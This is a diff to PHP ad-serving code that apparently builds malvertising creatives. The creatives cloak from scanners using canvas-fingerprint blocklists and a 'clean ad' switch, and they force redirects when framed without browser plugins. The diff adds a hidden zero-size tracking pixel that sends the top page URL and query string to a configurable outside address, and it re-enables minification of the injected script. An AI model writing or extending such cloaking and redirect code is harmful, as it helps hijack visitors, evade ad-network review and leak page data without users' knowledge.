@@ -595,8 +595,6 @@
 
 	function minify($text)
 	{
-		return $text;
-
 		$text = str_replace("\n", "", $text);
 		$text = str_replace("\r", "", $text);
 		$text = str_replace("\t", "", $text);
@@ -668,6 +666,8 @@
 	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] === "false" ? false : true;
 	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig['BlockedCanvasFingerprints'] : "";
 	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig['OutputMethod'] : "";
+	$trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $adConfig) && $adConfig["TrackingPixelEnabled"] === "false" ? false : true;
+	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig['TrackingPixelUrl'] : "";
 
 	if (empty($redirectUrl))
 	{
@@ -699,8 +699,6 @@
 			'subdiv2:"'.$geo['subdiv2'].'",'.
 			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
 	}
-
-	$serveCleanAd = false;
 
 	if (!$serveCleanAd && array_key_exists('HTTP_REFERER', $_SERVER))
 	{
@@ -793,10 +791,58 @@
 		}
 	}
 
+	$referrerDomainScript = "function getReferrerDomain()
+						     {
+					            var topDomain = '';
+
+					            try
+					            {
+					                topDomain = window.top.location.href;
+					            }
+					            catch(e) { }
+
+					            if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
+					            {
+					                topDomain = document.referrer;
+					            }
+
+					            return topDomain;
+						     }";
+
+	if ($trackingPixelEnabled && !empty($trackingPixelUrl))
+	{
+		// Append referrer
+		$trackingPixelUrl = appendReferrerParameter($trackingPixelUrl);
+
+		$trackingPixelScript = "function addTrackingPixel()
+						        {
+						            var topDomain = getReferrerDomain();
+
+						            var el = document.createElement('img');
+						            el.src = '$trackingPixelUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+						            el.width = 0;
+						            el.height = 0;
+						            el.border = 0;
+						            document.body.appendChild(el);
+						        }";
+	}
+
+	$serveCleanAd = false;
+
 	if ($serveCleanAd || !$redirectEnabled)
 	{
-		$resultHtml = str_replace("{script}", "", $resultHtml);
-		$resultHtml = str_replace("{onload}", "", $resultHtml);
+		if ($trackingPixelEnabled && !empty($trackingPixelUrl))
+		{
+			$onloadCode = " onload=\"addTrackingPixel();\"";
+
+			$resultHtml = str_replace("{script}", minify("<script type=\"text/javascript\">\n" . $referrerDomainScript . $trackingPixelScript . "\n</script>"), $resultHtml);
+			$resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
+		}
+		else
+		{
+			$resultHtml = str_replace("{script}", "", $resultHtml);
+			$resultHtml = str_replace("{onload}", "", $resultHtml);
+		}
 
 		if ($outputMethod === "JS")
 		{
@@ -859,6 +905,7 @@
 		}
 
 		$scriptCode = "<script type=\"text/javascript\">" .
+						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
 						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
 						   "function canvasFingerprint()
 							{
@@ -895,7 +942,7 @@
 									hash = hash & hash;
 								}
 
-								//console.log(hash);
+								/* console.log(hash); */
 
 								return hash;
 							}
@@ -907,7 +954,9 @@
 								return blockedList.indexOf(canvasFingerprint()) !== -1;
 							}" : "") .
 
-						   "function inIframe ()
+						   "$referrerDomainScript
+
+						    function inIframe ()
 							{
 							    try
 							    {
@@ -920,8 +969,9 @@
 							}
 
 							function go()
-							{
-								if (inIframe() && navigator.plugins.length == 0)
+							{" .
+								($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
+							   "if (inIframe() && navigator.plugins.length == 0)
 						   		{
 						   			if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
 		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))
@@ -933,18 +983,7 @@
 										}" : "") .
 									   "setTimeout(function()
 										{
-											var topDomain = '';
-
-											try
-											{
-												topDomain = window.top.location.href;
-											}
-											catch(e) { }
-
-											if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
-											{
-												topDomain = document.referrer;
-											}
+											var topDomain = getReferrerDomain();
 
 											$redirectCode
 										}, $redirectTimeout);
